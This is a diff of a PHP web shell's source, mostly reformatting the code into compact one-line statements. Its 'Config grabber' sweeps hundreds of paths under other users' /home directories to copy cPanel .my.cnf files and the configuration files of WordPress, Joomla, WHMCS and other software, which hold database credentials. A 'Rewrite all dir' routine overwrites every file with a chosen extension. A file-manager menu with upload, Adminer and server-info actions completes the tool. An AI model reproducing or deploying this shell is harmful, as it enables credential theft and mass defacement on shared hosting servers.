-                    "/home/$user/public_html/support/order/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/includes/dist-configure.php" => "Zencart",
-                    "/home/$user/public_html/zencart/includes/dist-configure.php" => "Zencart",
-                    "/home/$user/public_html/products/includes/dist-configure.php" => "Zencart",
-                    "/home/$user/public_html/cart/includes/dist-configure.php" => "Zencart",
-                    "/home/$user/public_html/shop/includes/dist-configure.php" => "Zencart",
-                    "/home/$user/public_html/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/hostbills/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/host/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/Host/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/supportes/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/support/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/hosting/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/cart/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/order/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/client/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/clients/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/cliente/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/clientes/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/billing/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/billings/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/my/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/secure/includes/iso4217.php" => "Hostbills",
-                    "/home/$user/public_html/support/order/includes/iso4217.php" => "Hostbills",
-                ];
-            }
+            if (is_readable($user_config)) {$grab_config = ["/home/$user/.my.cnf" => "cpanel","/home/$user/public_html/config/koneksi.php" => "Lokomedia","/home/$user/public_html/forum/config.php" => "phpBB","/home/$user/public_html/sites/default/settings.php" => "Drupal","/home/$user/public_html/config/settings.inc.php" => "PrestaShop","/home/$user/public_html/app/etc/local.xml" => "Magento","/home/$user/public_html/admin/config.php" => "OpenCart","/home/$user/public_html/application/config/database.php" => "Ellislab","/home/$user/public_html/vb/includes/config.php" => "Vbulletin","/home/$user/public_html/includes/config.php" => "Vbulletin","/home/$user/public_html/forum/includes/config.php" => "Vbulletin","/home/$user/public_html/forums/includes/config.php" => "Vbulletin","/home/$user/public_html/cc/includes/config.php" => "Vbulletin","/home/$user/public_html/inc/config.php" => "MyBB","/home/$user/public_html/includes/configure.php" => "OsCommerce","/home/$user/public_html/shop/includes/configure.php" => "OsCommerce","/home/$user/public_html/os/includes/configure.php" => "OsCommerce","/home/$user/public_html/oscom/includes/configure.php" => "OsCommerce","/home/$user/public_html/products/includes/configure.php" => "OsCommerce","/home/$user/public_html/cart/includes/configure.php" => "OsCommerce","/home/$user/public_html/inc/conf_global.php" => "IPB","/home/$user/public_html/wp-config.php" => "Wordpress","/home/$user/public_html/wp/test/wp-config.php" => "Wordpress","/home/$user/public_html/blog/wp-config.php" => "Wordpress","/home/$user/public_html/beta/wp-config.php" => "Wordpress","/home/$user/public_html/portal/wp-config.php" => "Wordpress","/home/$user/public_html/site/wp-config.php" => "Wordpress","/home/$user/public_html/wp/wp-config.php" => "Wordpress","/home/$user/public_html/WP/wp-config.php" => "Wordpress","/home/$user/public_html/news/wp-config.php" => "Wordpress","/home/$user/public_html/wordpress/wp-config.php" => "Wordpress","/home/$user/public_html/test/wp-config.php" => "Wordpress","/home/$user/public_html/demo/wp-config.php" => "Wordpress","/home/$user/public_html/home/wp-config.php" => "Wordpress","/home/$user/public_html/v1/wp-config.php" => "Wordpress","/home/$user/public_html/v2/wp-config.php" => "Wordpress","/home/$user/public_html/press/wp-config.php" => "Wordpress","/home/$user/public_html/new/wp-config.php" => "Wordpress","/home/$user/public_html/blogs/wp-config.php" => "Wordpress","/home/$user/public_html/configuration.php" => "Joomla","/home/$user/public_html/blog/configuration.php" => "Joomla","/home/$user/public_html/submitticket.php" => "^WHMCS","/home/$user/public_html/cms/configuration.php" => "Joomla","/home/$user/public_html/beta/configuration.php" => "Joomla","/home/$user/public_html/portal/configuration.php" => "Joomla","/home/$user/public_html/site/configuration.php" => "Joomla","/home/$user/public_html/main/configuration.php" => "Joomla","/home/$user/public_html/home/configuration.php" => "Joomla","/home/$user/public_html/demo/configuration.php" => "Joomla","/home/$user/public_html/test/configuration.php" => "Joomla","/home/$user/public_html/v1/configuration.php" => "Joomla","/home/$user/public_html/v2/configuration.php" => "Joomla","/home/$user/public_html/joomla/configuration.php" => "Joomla","/home/$user/public_html/new/configuration.php" => "Joomla","/home/$user/public_html/WHMCS/submitticket.php" => "WHMCS","/home/$user/public_html/whmcs1/submitticket.php" => "WHMCS","/home/$user/public_html/Whmcs/submitticket.php" => "WHMCS","/home/$user/public_html/whmcs/submitticket.php" => "WHMCS","/home/$user/public_html/whmcs/submitticket.php" => "WHMCS","/home/$user/public_html/WHMC/submitticket.php" => "WHMCS","/home/$user/public_html/Whmc/submitticket.php" => "WHMCS","/home/$user/public_html/whmc/submitticket.php" => "WHMCS","/home/$user/public_html/WHM/submitticket.php" => "WHMCS","/home/$user/public_html/Whm/submitticket.php" => "WHMCS","/home/$user/public_html/whm/submitticket.php" => "WHMCS","/home/$user/public_html/HOST/submitticket.php" => "WHMCS","/home/$user/public_html/Host/submitticket.php" => "WHMCS","/home/$user/public_html/host/submitticket.php" => "WHMCS","/home/$user/public_html/SUPPORTES/submitticket.php" => "WHMCS","/home/$user/public_html/Supportes/submitticket.php" => "WHMCS","/home/$user/public_html/supportes/submitticket.php" => "WHMCS","/home/$user/public_html/domains/submitticket.php" => "WHMCS","/home/$user/public_html/domain/submitticket.php" => "WHMCS","/home/$user/public_html/Hosting/submitticket.php" => "WHMCS","/home/$user/public_html/HOSTING/submitticket.php" => "WHMCS","/home/$user/public_html/hosting/submitticket.php" => "WHMCS","/home/$user/public_html/CART/submitticket.php" => "WHMCS","/home/$user/public_html/Cart/submitticket.php" => "WHMCS","/home/$user/public_html/cart/submitticket.php" => "WHMCS","/home/$user/public_html/ORDER/submitticket.php" => "WHMCS","/home/$user/public_html/Order/submitticket.php" => "WHMCS","/home/$user/public_html/order/submitticket.php" => "WHMCS","/home/$user/public_html/CLIENT/submitticket.php" => "WHMCS","/home/$user/public_html/Client/submitticket.php" => "WHMCS","/home/$user/public_html/client/submitticket.php" => "WHMCS","/home/$user/public_html/CLIENTAREA/submitticket.php" => "WHMCS","/home/$user/public_html/Clientarea/submitticket.php" => "WHMCS","/home/$user/public_html/clientarea/submitticket.php" => "WHMCS","/home/$user/public_html/SUPPORT/submitticket.php" => "WHMCS","/home/$user/public_html/Support/submitticket.php" => "WHMCS","/home/$user/public_html/support/submitticket.php" => "WHMCS","/home/$user/public_html/BILLING/submitticket.php" => "WHMCS","/home/$user/public_html/Billing/submitticket.php" => "WHMCS","/home/$user/public_html/billing/submitticket.php" => "WHMCS","/home/$user/public_html/BUY/sumitticket.php" => "WHMCS","/home/$user/public_html/Buy/submitticket.php" => "WHMCS","/home/$user/public_html/buy/submitticket.php" => "WHMCS","/home/$user/public_html/MANAGE/submitticket.php" => "WHMCS","/home/$user/public_html/Manage/submitticket.php" => "WHMCS","/home/$user/public_html/manage/submitticket.php" => "WHMCS","/home/$user/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS","/home/$user/public_html/ClientSupport/submitticket.php" => "WHMCS","/home/$user/public_html/Clientsupport/submitticket.php" => "WHMCS","/home/$user/public_html/clientsupport/submitticket.php" => "WHMCS","/home/$user/public_html/CHECKOUT/submitticket.php" => "WHMCS","/home/$user/public_html/Checkout/submitticket.php" => "WHMCS","/home/$user/public_html/checkout/submitticket.php" => "WHMCS","/home/$user/public_html/BILLINGS/submitticket.php" => "WHMCS","/home/$user/public_html/Billings/submitticket.php" => "WHMCS","/home/$user/public_html/billings/submitticket.php" => "WHMCS","/home/$user/public_html/BASKET/submitticket.php" => "WHMCS","/home/$user/public_html/Basket/submitticket.php" => "WHMCS","/home/$user/public_html/basket/submitticket.php" => "WHMCS","/home/$user/public_html/SECURE/submitticket.php" => "WHMCS","/home/$user/public_html/Secure/submitticket.php" => "WHMCS","/home/$user/public_html/secure/submitticket.php" => "WHMCS","/home/$user/public_html/SALES/submitticket.php" => "WHMCS","/home/$user/public_html/Sales/submitticket.php" => "WHMCS","/home/$user/public_html/sales/submitticket.php" => "WHMCS","/home/$user/public_html/BILL/submitticket.php" => "WHMCS","/home/$user/public_html/Bill/submitticket.php" => "WHMCS","/home/$user/public_html/bill/submitticket.php" => "WHMCS","/home/$user/public_html/PURCHASE/submitticket.php" => "WHMCS","/home/$user/public_html/Purchase/submitticket.php" => "WHMCS","/home/$user/public_html/purchase/submitticket.php" => "WHMCS","/home/$user/public_html/ACCOUNT/submitticket.php" => "WHMCS","/home/$user/public_html/Account/submitticket.php" => "WHMCS","/home/$user/public_html/account/submitticket.php" => "WHMCS","/home/$user/public_html/USER/submitticket.php" => "WHMCS","/home/$user/public_html/User/submitticket.php" => "WHMCS","/home/$user/public_html/user/submitticket.php" => "WHMCS","/home/$user/public_html/CLIENTS/submitticket.php" => "WHMCS","/home/$user/public_html/Clients/submitticket.php" => "WHMCS","/home/$user/public_html/clients/submitticket.php" => "WHMCS","/home/$user/public_html/BILLINGS/submitticket.php" => "WHMCS","/home/$user/public_html/Billings/submitticket.php" => "WHMCS","/home/$user/public_html/billings/submitticket.php" => "WHMCS","/home/$user/public_html/MY/submitticket.php" => "WHMCS","/home/$user/public_html/My/submitticket.php" => "WHMCS","/home/$user/public_html/my/submitticket.php" => "WHMCS","/home/$user/public_html/secure/whm/submitticket.php" => "WHMCS","/home/$user/public_html/secure/whmcs/submitticket.php" => "WHMCS","/home/$user/public_html/panel/submitticket.php" => "WHMCS","/home/$user/public_html/clientes/submitticket.php" => "WHMCS","/home/$user/public_html/cliente/submitticket.php" => "WHMCS","/home/$user/public_html/support/order/submitticket.php" => "WHMCS","/home/$user/public_html/bb-config.php" => "BoxBilling","/home/$user/public_html/boxbilling/bb-config.php" => "BoxBilling","/home/$user/public_html/box/bb-config.php" => "BoxBilling","/home/$user/public_html/host/bb-config.php" => "BoxBilling","/home/$user/public_html/Host/bb-config.php" => "BoxBilling","/home/$user/public_html/supportes/bb-config.php" => "BoxBilling","/home/$user/public_html/support/bb-config.php" => "BoxBilling","/home/$user/public_html/hosting/bb-config.php" => "BoxBilling","/home/$user/public_html/cart/bb-config.php" => "BoxBilling","/home/$user/public_html/order/bb-config.php" => "BoxBilling","/home/$user/public_html/client/bb-config.php" => "BoxBilling","/home/$user/public_html/clients/bb-config.php" => "BoxBilling","/home/$user/public_html/cliente/bb-config.php" => "BoxBilling","/home/$user/public_html/clientes/bb-config.php" => "BoxBilling","/home/$user/public_html/billing/bb-config.php" => "BoxBilling","/home/$user/public_html/billings/bb-config.php" => "BoxBilling","/home/$user/public_html/my/bb-config.php" => "BoxBilling","/home/$user/public_html/secure/bb-config.php" => "BoxBilling","/home/$user/public_html/support/order/bb-config.php" => "BoxBilling","/home/$user/public_html/includes/dist-configure.php" => "Zencart","/home/$user/public_html/zencart/includes/dist-configure.php" => "Zencart","/home/$user/public_html/products/includes/dist-configure.php" => "Zencart","/home/$user/public_html/cart/includes/dist-configure.php" => "Zencart","/home/$user/public_html/shop/includes/dist-configure.php" => "Zencart","/home/$user/public_html/includes/iso4217.php" => "Hostbills","/home/$user/public_html/hostbills/includes/iso4217.php" => "Hostbills","/home/$user/public_html/host/includes/iso4217.php" => "Hostbills","/home/$user/public_html/Host/includes/iso4217.php" => "Hostbills","/home/$user/public_html/supportes/includes/iso4217.php" => "Hostbills","/home/$user/public_html/support/includes/iso4217.php" => "Hostbills","/home/$user/public_html/hosting/includes/iso4217.php" => "Hostbills","/home/$user/public_html/cart/includes/iso4217.php" => "Hostbills","/home/$user/public_html/order/includes/iso4217.php" => "Hostbills","/home/$user/public_html/client/includes/iso4217.php" => "Hostbills","/home/$user/public_html/clients/includes/iso4217.php" => "Hostbills","/home/$user/public_html/cliente/includes/iso4217.php" => "Hostbills","/home/$user/public_html/clientes/includes/iso4217.php" => "Hostbills","/home/$user/public_html/billing/includes/iso4217.php" => "Hostbills","/home/$user/public_html/billings/includes/iso4217.php" => "Hostbills","/home/$user/public_html/my/includes/iso4217.php" => "Hostbills","/home/$user/public_html/secure/includes/iso4217.php" => "Hostbills","/home/$user/public_html/support/order/includes/iso4217.php" => "Hostbills",];}
             foreach ($grab_config as $config => $config_name) {
                 $get_config = file_get_contents($config);
-                if ($get_config == '') {
-                } else {
-                    $file_config = fopen(
-                        ".config/" . $user . "-" . $config_name . ".txt",
-                        'w'
-                    );
-                    fputs($file_config, $get_config);
-                }
+                if($get_config==''){}
+                else {$file_config=fopen(".config/".$user."-".$config_name.".txt",'w');fputs($file_config, $get_config);}
             }
         }
     }
     public static function rewrite($dir, $extension, $text)
     {
         if (is_writable($dir)) {
-            foreach (self::listFile($dir) as $key => $value) {
-                switch (self::getext($value)) {
+            foreach(self::listFile($dir)as$key=>$value) {
+                switch(self::getext($value)) {
                     case $extension:
-                        if (
-                            preg_match(
-                                '/' . basename($value) . "$/i",
-                                $_SERVER['PHP_SELF'],
-                                $matches
-                            ) == 0
-                        ) {
-                            if (file_put_contents($value, $text)) { ?>
-                                <div class="rewrite-success">
-                                    <?= $value ?>
-                                </div>
+                        if (preg_match('/'.basename($value)."$/i",$_SERVER['PHP_SELF'],$matches)==0) {
+                            if(file_put_contents($value, $text)){ ?>
+                                <div class="rewrite-success"><?= $value ?></div>
                                 <?php } else {if (is_readable($value)) { ?>
-                                <div class="rewrite-failed">
-                                    <?= $value ?>
-                                </div>
+                                <div class="rewrite-failed"><?= $value ?></div>
                                 <?php }}
                         }
                         break;
@@ -670,264 +291,75 @@ class XN
             }
         }
     }
-    public static function replace($filename)
-    {
-        return str_replace([' ', '.', ':', '-', '(', ')'], '', $filename);
-    }
+    public static function replace($filename){return str_replace([' ', '.', ':', '-', '(', ')'], '', $filename);}
     public static function formatSize($bytes)
     {
         $types = ['Byte', 'KB', 'MB', 'GB', 'TB'];
-        for (
-            $i = 0;
-            $bytes >= 1024 && $i < count($types) - 1;
-            $bytes /= 1024, $i++
-        );
+        for ($i=0;$bytes>=1024&&$i<count($types)-1;$bytes/=1024,$i++);
         return round($bytes, 2) . " " . $types[$i];
     }
     public static function hdd($type = null)
     {
         switch ($type) {
-            case 'free':
-                return self::formatSize(
-                    disk_free_space($_SERVER['DOCUMENT_ROOT'])
-                );
-                break;
-            case 'total':
-                return self::formatSize(
-                    disk_total_space($_SERVER['DOCUMENT_ROOT'])
-                );
-                break;
-            case 'used':
-                $free = disk_free_space($_SERVER['DOCUMENT_ROOT']);
-                $total = disk_total_space($_SERVER['DOCUMENT_ROOT']);
-                $used = $total - $free;
-                return self::formatSize($used);
-                break;
+            case 'free':return self::formatSize(disk_free_space($_SERVER['DOCUMENT_ROOT']));break;
+            case 'total':return self::formatSize(disk_total_space($_SERVER['DOCUMENT_ROOT']));break;
+            case 'used':$free=disk_free_space($_SERVER['DOCUMENT_ROOT']);$total=disk_total_space($_SERVER['DOCUMENT_ROOT']);$used=$total-$free;return self::formatSize($used);break;
         }
     }
     static public function disk($path) {
-	$letters = "";
-	$v = explode("\\", $path);
-	$v = $v[0];
-	 foreach(range("A", "Z") as $letter) {
-	  	$bool = $isdiskette = in_array($letter, array("A"));
-	  	if(!$bool) $bool = is_dir("{$letter}:\\");
+	$letters="";$v=explode("\\",$path);$v=$v[0];
+	 foreach(range("A","Z")as$letter) {
+	  	$bool=$isdiskette=in_array($letter,array("A"));
+	  	if(!$bool)$bool=is_dir("{$letter}:\\");
 	  	if($bool) {
-	   		$letters .= "<a href='?x={$letter}:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
-	   		if($letter.":" != $v) {
-	   			$letters .= "<div class='diskk'>
-	   						 <div class='img'>
-	   						 <img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828703.svg'>
-	   						 </div>
-	   						 <div class='letter'>{$letter}</div> 
-	   						 </div>";
-	   		}
-	   		else {
-	   			$letters .= "<div class='usb'>
-	   						 <div class='img'>
-	   						 <img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828650.svg'>
-	   						 </div>
-	   						 <div class='letter'>{$letter}</div> 
-	   						</div>";
-	   		}
+	   		$letters.="<a href='?x={$letter}:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
+	   		if($letter.":"!=$v){$letters.="<div class='diskk'><div class='img'><img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828703.svg'></div><div class='letter'>{$letter}</div> </div>";}
+	   		else {$letters.="<div class='usb'><div class='img'><img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828650.svg'></div><div class='letter'>{$letter}</div></div>";}
 	   		$letters .= "</a>";
 	  	}
 	}
 	if(!empty($letters)) { ?>
 		<table class="disk" width="100%">
 			<tr>
-				<td>
-					Detected Drives
-				</td>
+				<td>Detected Drives</td>
 				<td>:</td>
-				<td>
-					<?= $letters ?>
-				</td>
+				<td><?= $letters ?></td>
 			</tr>
 		</table>
 	<?php }
 }
-    public static function countAllFiles($directory)
-    {
-        self::$array = [];
-        self::$directory = opendir($directory);
-        while ($object = readdir(self::$directory)) {
-            if ($object != '.' && $object != '..') {
-                $files[] = $object;
-            }
-        }
-        $numFile = @count($files);
-        if ($numFile) {
-            return $numFile;
-        } else {
-            print '<i>no files</i>';
-        }
-    }
 }
-if (isset($_GET['x'])) {
-    XN::cd($_GET['x']);
-}
-function search()
-{
-    ?> <input type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name"> <?php
-}
+if (isset($_GET['x'])){XN::cd($_GET['x']);}
+function search(){?><input type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name"><?php }
 function head($x, $y, $class = null)
 {
     ?>
     <div class="back">
-        <a href="?x=<?= $y ?>">
-            <i class="fa fa-arrow-left" aria-hidden="true"></i>
-        </a>
-        <div class="dirname">
-            <?= XN::wr(getcwd(), $x, 1) ?>
-        </div>
-        <button class="dropdown-toggle toggle" title="Menu">
-            <i class="fas fa-bars"></i>
-        </button>
+        <a href="?x=<?= $y ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a>
+        <div class="dirname"><?=XN::wr(getcwd(),$x,1) ?></div>
+        <button class="dropdown-toggle toggle" title="Menu"><i class="fas fa-bars"></i></button>
         <ul class="dropdown-tool">
             <form method="post" action="?x=<?= getcwd() ?>">
+                <li><button onclick="location.href='?x='" type="button"><div class="icon"><a><i class="fas fa-home"></i></a></div><div class="font">Home</div></button></li>
+                <li><button onclick="location.href='?x=<?= $_SERVER['DOCUMENT_ROOT'] ?>'" type="button"><div class="icon"><a><i class="fas fa-reply-all"></i></a></div><div class="font">Home root</div></button></li>
+                <li><button name="action" value="info"><div class="icon"><a><i class="fas fa-info-circle"></i></a></div><div class="font">Server info</div></button></li>
+                <li><button name="action" value="adminer"><div class="icon"><a><i class="fas fa-user"></i></a></div><div class="font">Adminer</div></button></li>
+                <li><button name="action" value="upload"><div class="icon"><a><i class="fa fa-upload" aria-hidden="true"></i></a></div><div class="font">Upload</div></button></li>
+                <li><button name="action" value="addfile"><div class="icon"><a><i class="fas fa-file-medical"></i></a></div><div class="font">Add file</div></button></li>
+                <li><button name="action" value="adddir"><div class="icon"><a><i class="fas fa-folder-plus"></i></a></div><div class="font">Add folder</div></button></li>
+                <li><button name="action" value="config"><div class="icon"><a><i class="fa fa-cog" aria-hidden="true"></i></a></div><div class="font">Config grabber</div></button></li>
+                <li><button type="button" onclick="$(document).ready(function(){jqxAlert.alert('maintenance');})"><div class="icon"><a><i class="fas fa-bug"></i></a></div><div class="font">Jumping</div></button></li>
+                <li><button type="button" onclick="$(document).ready(function(){jqxAlert.alert('maintenance');})"><div class="icon"><a><i class="fas fa-clone"></i></a></div><div class="font">Symlink</div></button></li>
                 <li>
-                    <button onclick="location.href='?x='" type="button">
-                        <div class="icon">
-                            <a><i class="fas fa-home"></i></a>
-                        </div>
-                        <div class="font">
-                            Home
-                        </div>
-                    </button>
+                    <button name="action" value="rewrite"><div class="icon"><a><i class="fas fa-exclamation-triangle"></i></a></div><div class="font">Rewrite all dir</div></button>
                 </li>
-                <li>
-                    <button onclick="location.href='?x=<?= $_SERVER['DOCUMENT_ROOT'] ?>'" type="button">
-                        <div class="icon">
-                            <a><i class="fas fa-reply-all"></i></a>
-                        </div>
-                        <div class="font">
-                            Home root
-                        </div>
-                    </button>
-                </li>
-                <li>
-                    <button name="action" value="info">
-                        <div class="icon">
-                            <a><i class="fas fa-info-circle"></i></a>
-                        </div>
-                        <div class="font">
-                            Server info
-                        </div>
-                    </button>
-                </li>
-                <li>
-                    <button name="action" value="adminer">
-                        <div class="icon">
-                            <a><i class="fas fa-user"></i></a>
-                        </div>
-                        <div class="font">
-                            Adminer
-                        </div>
-                    </button>
-                </li>
-                <li>
-                    <button name="action" value="upload">
-                        <div class="icon">
-                            <a><i class="fa fa-upload" aria-hidden="true"></i></a>
-                        </div>
-                        <div class="font">
-                            Upload
-                        </div>
-                    </button>
-                </li>
-                <li>
-                    <button name="action" value="addfile">
-                        <div class="icon">
-                            <a><i class="fas fa-file-medical"></i></a>
-                        </div>
-                        <div class="font">
-                            Add file
-                        </div>
-                    </button>
-                </li>
-                <li>
-                    <button name="action" value="adddir">
-                        <div class="icon">
-                            <a><i class="fas fa-folder-plus"></i></a>
-                        </div>
-                        <div class="font">
-                            Add folder
-                        </div>
-                    </button>
-                </li>
-                <li>
-                    <button name="action" value="config">
-                        <div class="icon">
-                            <a><i class="fa fa-cog" aria-hidden="true"></i></a>
-                        </div>
-                        <div class="font">
-                            Config grabber
-                        </div>
-                    </button>
-                </li>
-                <li>
-                    <button type="button" onclick="$(document).ready(function () {
-                        jqxAlert.alert('maintenance');
-                    })">
-                        <div class="icon">
-                            <a><i class="fas fa-bug"></i></a>
-                        </div>
-                        <div class="font">
-                            Jumping
-                        </div>
-                    </button>
-                </li>
-                <li>
-                    <button type="button" onclick="$(document).ready(function () {
-                        jqxAlert.alert('maintenance');
-                    })">
-                        <div class="icon">
-                            <a><i class="fas fa-clone"></i></a>
-                        </div>
-                        <div class="font">
-                            Symlink
-                        </div>
-                    </button>
-                </li>
-                <li>
-                    <button name="action" value="rewrite">
-                        <div class="icon">
-                            <a><i class="fas fa-exclamation-triangle"></i></a>
-                        </div>
-                        <div class="font">
-                            Rewrite all dir
-                        </div>
-                    </button>
-                </li>
-                <li>
-                    <button type="button" onclick="$(document).ready(function () {
-                        jqxAlert.alert('maintenance');
-                    })">
-                        <div class="icon">
-                            <a><i class="fa fa-info-circle" aria-hidden="true"></i></a>
-                        </div>
-                        <div class="font">
-                            About me
-                        </div>
-                    </button>
-                </li>
-                <li>
-                    <button>
-                        <div class="icon">
-                            <a><i class="fa fa-power-off" aria-hidden="true"></i></a>
-                        </div>
-                        <div class="font">
-                            Logout
-                        </div>
-                    </button>
+                <li><button type="button" onclick="$(document).ready(function(){jqxAlert.alert('maintenance');})"><div class="icon"><a><i class="fa fa-info-circle" aria-hidden="true"></i></a></div><div class="font">About me</div></button></li>
+                <li><button><div class="icon"><a><i class="fa fa-power-off" aria-hidden="true"></i></a></div><div class="font">Logout</div></button>
                 </li>
                 <!-- <input type="hidden" name="file" value="<?= $dir['name'] ?>"> -->
             </form>
         </ul>
-        <div class="mobile">
-            <input class="<?= $class ?>" type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name">
-        </div>
+        <div class="mobile"><input class="<?= $class ?>" type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name"></div>
     </div>
     <?php
 }
@@ -1811,73 +1243,35 @@ function filterTable() {
  	$(".close").on("click",function(){$(".container").fadeOut();$(".open").fadeIn();});});
 </script>
 <script type="text/javascript">
-    jqxAlert = {
-        top: 0,
-        left: 0,
-        overlayOpacity: 0.2,
-        overlayColor: 'rgba(0, 0, 0, 0.3)',
-        alert: function (message, title) {
-            if (title == null) title = 'Alert !';
-            jqxAlert._show(title, message);
-        },
+    jqxAlert = {top: 0,left: 0,overlayOpacity: 0.2,overlayColor: 'rgba(0, 0, 0, 0.3)',
+        alert: function (message, title){if (title == null) title = 'Alert !';jqxAlert._show(title, message);},
         _show: function (title, msg) {
             jqxAlert._hide();
             jqxAlert._handleOverlay('show');
             $("BODY").append(
-                      '<div class="jqx-alert" id="alert_container">' +
-                      '<div id="alert_title"></div>' +
-                      '<div id="alert_content">' +
-                      '<div id="message"></div>' +
-                      '<input type="button" value="OK" id="alert_button"/>' +
-                      '</div>' +
-                      '</div>');
+                      '<div class="jqx-alert" id="alert_container">'+'<div id="alert_title"></div>'+'<div id="alert_content">'+'<div id="message"></div>'+'<input type="button" value="OK" id="alert_button"/>'+'</div>'+'</div>');
             $("#alert_title").text(title);
             $("#alert_title").addClass('jqx-alert-header');
             $("#alert_content").addClass('jqx-alert-content');
             $("#message").text(msg);
-            $("#alert_button").click(function () {
-                jqxAlert._hide();
-            });
-            jqxAlert._setPosition();
-        },
-        _hide: function () {
-            $("#alert_container").remove();
-            jqxAlert._handleOverlay('hide');
-        },
+            $("#alert_button").click(function () {jqxAlert._hide();});jqxAlert._setPosition();},
+        _hide: function () {$("#alert_container").remove();jqxAlert._handleOverlay('hide');},
         _handleOverlay: function (status) {
             switch (status) {
                 case 'show':
                 jqxAlert._handleOverlay('hide');
                 $("BODY").append('<div id="alert_overlay"></div>');
-                $("#alert_overlay").css({
-                    position: 'absolute',
-                    zIndex: 99998,
-                    top: '0px',
-                    left: '0px',
-                    width: '100%',
-                    height: $(document).height(),
-                    background: jqxAlert.overlayColor,
-                    opacity: jqxAlert.overlayOpacity
-                });
+                $("#alert_overlay").css({position:'absolute',zIndex:99998,top:'0px',left:'0px',width:'100%',height: $(document).height(),background:jqxAlert.overlayColor,opacity:jqxAlert.overlayOpacity});
                 break;
-           case 'hide':
-                $("#alert_overlay").remove();
-                break;
+           case 'hide':$("#alert_overlay").remove();break;
             }
         },
         _setPosition: function () {
-            var top = (($(window).height() / 2) - ($("#alert_container").outerHeight() / 2)) + jqxAlert.top;
-            var left = (($(window).width() / 2) - ($("#alert_container").outerWidth() / 2)) + jqxAlert.left;
-            if (top < 0) {
-                top = 0;
-            }
-            if (left < 0) {
-                left = 0;
-            }
-            $("#alert_container").css({
-                top: top + 'px',
-                left: left + 'px'
-            });
+            var top=(($(window).height()/2)-($("#alert_container").outerHeight()/2))+jqxAlert.top;
+            var left=(($(window).width()/2)-($("#alert_container").outerWidth()/2))+jqxAlert.left;
+            if(top<0){top=0;}
+            if(left<0){left=0;}
+            $("#alert_container").css({top: top + 'px',left: left + 'px'});
             $("#alert_overlay").height($(document).height());
         }
     }
@@ -1887,90 +1281,43 @@ function filterTable() {
     <?php
     switch (@$_POST['action']) {
         case 'delete':
-            if (XN::delete($_POST['file'])) {
-                alert("".basename($_POST['file'])." Deleted");
-            } else {
-                alert("Permission Danied");
-            }
+            if (XN::delete($_POST['file'])){alert("".basename($_POST['file'])." Deleted");}
+            else{alert("Permission Danied");}
             break;
         case 'info':
             head('Server Info',getcwd(),'hidden'); ?>
             <div class="info">
                 <table>
                     <tr>
-                        <td class="info">
-                            Kernel
-                        </td>
-                        <td>
-                            <div class="engine">
-                                <input type="text" value="<?=XN::info('kernel')?>">
-                            </div>
-                        </td>
+                        <td class="info">Kernel</td>
+                        <td><div class="engine"><input type="text" value="<?=XN::info('kernel')?>"></div></td>
                     </tr>
                     <tr>
-                        <td class="info">
-                            Software
-                        </td>
-                        <td>
-                            <div class="engine">
-                                <input type="text" value="<?=XN::info('software')?>" readonly>
-                            </div>
-                        </td>
+                        <td class="info">Software</td>
+                        <td><div class="engine"><input type="text" value="<?=XN::info('software')?>" readonly></div></td>
                     </tr>
                     <tr>
-                        <td class="info">
-                            IP
-                        </td>
-                        <td>
-                            <div class="engine">
-                                <input type="text" value="<?=XN::info('ip')?>" readonly>
-                            </div>
-                        </td>
+                        <td class="info">IP</td>
+                        <td><div class="engine"><input type="text" value="<?=XN::info('ip')?>" readonly></div></td>
                     </tr>
                     <tr>
-                        <td class="info">
-                            PHP Version
-                        </td>
-                        <td>
-                            <div class="engine">
-                                <input type="text" value="<?=XN::info('phpversion')?>" readonly>
-                            </div>
-                        </td>
+                        <td class="info">PHP Version</td>
+                        <td><div class="engine"><input type="text" value="<?=XN::info('phpversion')?>" readonly></div></td>
                     </tr>
                     <tr>
-                        <td class="info">
-                            Domains
-                        </td>
-                        <td>
-                            <div class="engine">
-                                <input type="text" value="<?=XN::info('domain')?>" readonly>
-                            </div>
-                        </td>
+                        <td class="info">Domains</td>
+                        <td><div class="engine"><input type="text" value="<?=XN::info('domain')?>" readonly></div></td>
                     </tr>
                     <tr>
-                        <td class="info">
-                            Disable Function
-                        </td>
-                        <td>
-                            <div class="engine">
-                                <input type="text" value="<?=XN::info('disable_function')?>">
-                            </div>
-                        </td>
+                        <td class="info">Disable Function</td>
+                        <td><div class="engine"><input type="text" value="<?=XN::info('disable_function')?>"></div></td>
                     </tr>
                     <tr>
-                        <td class="info">
-                            Safe Mode
-                        </td>
-                        <td>
-                            <div class="engine">
-                                <input type="text" value="<?=XN::info('safe_mode')?>" readonly>
-                            </div>
-                        </td>
+                        <td class="info">Safe Mode</td>
+                        <td><div class="engine"><input type="text" value="<?=XN::info('safe_mode')?>" readonly></div></td>
                     </tr>
                     <tr>
-                        <td class="info" colspan="3">
-                            <?=XN::info('lib')?>
